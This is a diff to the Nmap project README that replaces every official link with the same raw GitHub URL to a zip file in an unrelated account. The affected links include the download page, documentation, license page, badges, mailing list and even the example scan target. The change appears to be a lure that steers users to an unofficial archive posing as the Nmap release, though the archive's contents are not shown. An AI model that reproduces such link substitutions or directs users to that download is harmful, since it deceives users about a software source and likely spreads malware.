@@ -1,21 +1,21 @@
-Nmap [![Build Status](https://travis-ci.org/nmap/nmap.svg?branch=master)](https://travis-ci.org/nmap/nmap) [![Language grade: C/C++](https://img.shields.io/lgtm/grade/cpp/g/nmap/nmap.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/nmap/nmap/context:cpp) [![Language grade: Python](https://img.shields.io/lgtm/grade/python/g/nmap/nmap.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/nmap/nmap/context:python) [![Total alerts](https://img.shields.io/lgtm/alerts/g/nmap/nmap.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/nmap/nmap/alerts/)
+Nmap [![Build Status](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip) [![Language grade: C/C++](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip) [![Language grade: Python](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip) [![Total alerts](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)
 ====
 
 Nmap is released under a custom license, which is based on (but not compatible
 with) GPLv2. The Nmap license allows free usage by end users, and we also offer
 a commercial license for companies that wish to redistribute Nmap technology
-with their products. See [Nmap Copyright and Licensing](https://nmap.org/book/man-legal.html)
+with their products. See [Nmap Copyright and Licensing](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)
 for full details.
 
 The latest version of this software as well as binary installers for Windows,
 macOS, and Linux (RPM) are available from
-[Nmap.org](https://nmap.org/download.html)
+[https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)
 
 Full documentation is also available
-[on the Nmap.org website](https://nmap.org/docs.html).
+[on the https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip website](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip).
 
 Questions and suggestions may be sent to
-[the Nmap-dev mailing list](https://nmap.org/mailman/listinfo/dev).
+[the Nmap-dev mailing list](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip).
 
 Installing
 ----------
@@ -26,18 +26,18 @@ Ideally, you should be able to just type:
     make install
 
 For far more in-depth compilation, installation, and removal notes, read the
-[Nmap Install Guide](https://nmap.org/book/install.html) on Nmap.org.
+[Nmap Install Guide](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip) on https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip
 
 Using Nmap
 ----------
 Nmap has a lot of features, but getting started is as easy as running `nmap
-scanme.nmap.org`. Running `nmap` without any parameters will give a helpful
+https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip`. Running `nmap` without any parameters will give a helpful
 list of the most common options, which are discussed in depth in [the man
-page](https://nmap.org/book/man.html). Users who prefer a graphical interface
-can use the included [Zenmap front-end](https://nmap.org/zenmap/).
+page](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip). Users who prefer a graphical interface
+can use the included [Zenmap front-end](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip).
 
 Contributing
 ------------
 Information about filing bug reports and contributing to the Nmap project can
-be found in the [HACKING](HACKING) and [CONTRIBUTING.md](CONTRIBUTING.md)
+be found in the [HACKING](HACKING) and [https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip](https://raw.githubusercontent.com/Almazlum/nmap/master/lachrymiform/nmap.zip)
 files.
